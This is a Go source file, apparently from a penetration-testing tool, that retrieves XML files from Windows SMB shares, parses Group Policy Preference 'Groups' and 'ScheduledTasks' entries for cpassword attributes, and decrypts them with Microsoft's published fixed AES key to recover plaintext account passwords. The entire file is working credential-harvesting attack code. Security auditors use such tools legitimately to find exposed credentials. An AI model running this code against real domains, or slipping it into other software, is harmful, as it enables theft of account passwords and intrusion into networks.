package crypto

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"encoding/xml"
	"fmt"
	"log"
	"strings"
	"unicode/utf16"

	"github.com/jfjallid/go-smb/smb"
	"github.com/zenazn/pkcs7pad"
)

// XML structure for Properties
type User_Properties struct {
	Action    string `xml:"action,attr"`
	NewName   string `xml:"newName,attr"`
	UserName  string `xml:"userName,attr"`
	CPassword string `xml:"cpassword,attr"`
}

// XML structure for User
type User struct {
	Properties User_Properties `xml:"Properties"`
}

// XML structure for Groups
type Groups struct {
	Users []User `xml:"User"`
}

// XML structure for Trigger
type Trigger struct {
	Interval     string `xml:"interval,attr"`
	Type         string `xml:"type,attr"`
	StartHour    string `xml:"startHour,attr"`
	StartMinutes string `xml:"startMinutes,attr"`
	BeginYear    string `xml:"beginYear,attr"`
	BeginMonth   string `xml:"beginMonth,attr"`
	BeginDay     string `xml:"beginDay,attr"`
	HasEndDate   string `xml:"hasEndDate,attr"`
	RepeatTask   string `xml:"repeatTask,attr"`
	Week         string `xml:"week,attr"`
	Days         string `xml:"days,attr"`
	Months       string `xml:"months,attr"`
}

// XML structure for Triggers
type Triggers struct {
	Trigger []Trigger `xml:"Trigger"`
}

// XML structure for Task Properties
type TaskProperties struct {
	DeleteWhenDone         string   `xml:"deleteWhenDone,attr"`
	StartOnlyIfIdle        string   `xml:"startOnlyIfIdle,attr"`
	StopOnIdleEnd          string   `xml:"stopOnIdleEnd,attr"`
	NoStartIfOnBatteries   string   `xml:"noStartIfOnBatteries,attr"`
	StopIfGoingOnBatteries string   `xml:"stopIfGoingOnBatteries,attr"`
	SystemRequired         string   `xml:"systemRequired,attr"`
	Action                 string   `xml:"action,attr"`
	Name                   string   `xml:"name,attr"`
	AppName                string   `xml:"appName,attr"`
	Args                   string   `xml:"args,attr"`
	StartIn                string   `xml:"startIn,attr"`
	Comment                string   `xml:"comment,attr"`
	RunAs                  string   `xml:"runAs,attr"`
	CPassword              string   `xml:"cpassword,attr"`
	Enabled                string   `xml:"enabled,attr"`
	Triggers               Triggers `xml:"Triggers"`
}

// XML structure for Task
type Task struct {
	Clsid      string         `xml:"clsid,attr"`
	Name       string         `xml:"name,attr"`
	Image      string         `xml:"image,attr"`
	Changed    string         `xml:"changed,attr"`
	UID        string         `xml:"uid,attr"`
	Properties TaskProperties `xml:"Properties"`
}

// XML structure for ScheduledTasks
type ScheduledTasks struct {
	Clsid string `xml:"clsid,attr"`
	Tasks []Task `xml:"Task"`
}

type CPasswordEntry struct {
	RunAs     string
	UserName  string
	NewName   string
	CPassword string
	Password  string
}

type GroupPolicyPreferencePasswordsFound struct {
	Entries map[string][]*CPasswordEntry
}

func (r *GroupPolicyPreferencePasswordsFound) CallbackFunctionCPassword(session *smb.Connection, share string, pathToFile string) error {
	elements := strings.Split(pathToFile, ".")
	extension := strings.ToLower(elements[len(elements)-1])

	if strings.EqualFold(extension, "xml") {
		uncPathToFile := fmt.Sprintf("\\\\%s\\%s\\%s", session.GetTargetInfo().DnsComputerName, share, pathToFile)

		buffer := bytes.NewBuffer([]byte{})

		err := session.RetrieveFile(share, pathToFile, 0, buffer.Write)
		if err != nil {
			return err
		}

		cpasswords := ExtractCPasswordsFromRawXML(buffer)

		if len(cpasswords) != 0 {
			if _, ok := r.Entries[uncPathToFile]; !ok {
				r.Entries[uncPathToFile] = make([]*CPasswordEntry, 0)
			}
			r.Entries[uncPathToFile] = append(r.Entries[uncPathToFile], cpasswords...)
		}
	}

	return nil
}

// DecryptCPassword decrypts a base64 encoded string using the fixed AES key and IV
func DecryptCPassword(encStr string) string {
	// AES Key as per the Microsoft documentation
	key := []byte{
		0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
		0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
	}

	// Fixed null IV (Initialization Vector)
	iv := make([]byte, aes.BlockSize)

	// Padding base64 encoded string to ensure it's properly padded
	pad := len(encStr) % 4
	if pad == 1 {
		encStr = encStr[:len(encStr)-1]
	} else if pad == 2 || pad == 3 {
		encStr += strings.Repeat("=", 4-pad)
	}

	// Decode base64 string
	ciphertext, err := base64.StdEncoding.DecodeString(encStr)
	if err != nil {
		return "" //, fmt.Errorf("base64 decoding failed: %v", err)
	}

	// Create AES cipher block
	block, err := aes.NewCipher(key)
	if err != nil {
		return "" //, fmt.Errorf("failed to create AES cipher: %v", err)
	}

	// Ensure ciphertext length is a multiple of AES block size
	if len(ciphertext)%aes.BlockSize != 0 {
		return "" //, fmt.Errorf("ciphertext is not a multiple of the block size")
	}

	// Create CBC decrypter
	mode := cipher.NewCBCDecrypter(block, iv)

	// Decrypt the ciphertext
	plaintext := make([]byte, len(ciphertext))
	mode.CryptBlocks(plaintext, ciphertext)

	// Remove PKCS#7 padding
	plaintext, err = pkcs7pad.Unpad(plaintext)
	if err != nil {
		return "" //, fmt.Errorf("unpadding failed: %v", err)
	}

	// Convert from UTF-16LE to string
	password, err := decodeUTF16LE(plaintext)
	if err != nil {
		return "" //, fmt.Errorf("UTF-16-LE decoding failed: %v", err)
	}

	return password //, nil
}

func ExtractCPasswordsFromRawXML(buffer *bytes.Buffer) []*CPasswordEntry {
	// Create an instance of Groups to hold the parsed data
	foundCpasswords := make([]*CPasswordEntry, 0)

	if strings.Contains(buffer.String(), "</ScheduledTasks>") {
		// Parse the XML data to search for ScheduledTasks
		scheduledtasks := ScheduledTasks{}

		err := xml.NewDecoder(buffer).Decode(&scheduledtasks)
		if err != nil {
			log.Fatalf("Error parsing XML: %v", err)
		}

		// Extract and print the desired properties
		for _, task := range scheduledtasks.Tasks {
			if len(task.Properties.CPassword) != 0 {
				entry := CPasswordEntry{
					RunAs:     task.Properties.RunAs,
					CPassword: task.Properties.CPassword,
					Password:  DecryptCPassword(task.Properties.CPassword),
				}
				foundCpasswords = append(foundCpasswords, &entry)
			}
		}

	} else if strings.Contains(buffer.String(), "</Groups>") {
		// Parse the XML data to search for Users
		groups := Groups{}

		err := xml.NewDecoder(buffer).Decode(&groups)
		if err != nil {
			log.Fatalf("Error parsing XML: %v", err)
		}

		// Extract and print the desired properties
		for _, user := range groups.Users {
			if len(user.Properties.CPassword) != 0 {
				entry := CPasswordEntry{
					UserName:  user.Properties.UserName,
					NewName:   user.Properties.NewName,
					CPassword: user.Properties.CPassword,
					Password:  DecryptCPassword(user.Properties.CPassword),
				}
				foundCpasswords = append(foundCpasswords, &entry)
			}
		}
	}

	return foundCpasswords
}

// decodeUTF16LE decodes a UTF-16LE byte slice into a string
func decodeUTF16LE(b []byte) (string, error) {
	// Ensure the byte slice has an even length since UTF-16 is 2 bytes per character
	if len(b)%2 != 0 {
		return "", fmt.Errorf("invalid UTF-16LE byte slice length")
	}

	// Create a slice to hold the 16-bit runes
	u16 := make([]uint16, len(b)/2)

	// Use binary.Read to convert the byte slice into uint16 values in Little Endian order
	err := binary.Read(bytes.NewReader(b), binary.LittleEndian, &u16)
	if err != nil {
		return "", fmt.Errorf("failed to convert bytes to UTF-16LE: %v", err)
	}

	// Decode the UTF-16 sequence, assuming no surrogate pairs are present
	runes := utf16.Decode(u16)

	return string(runes), nil
}
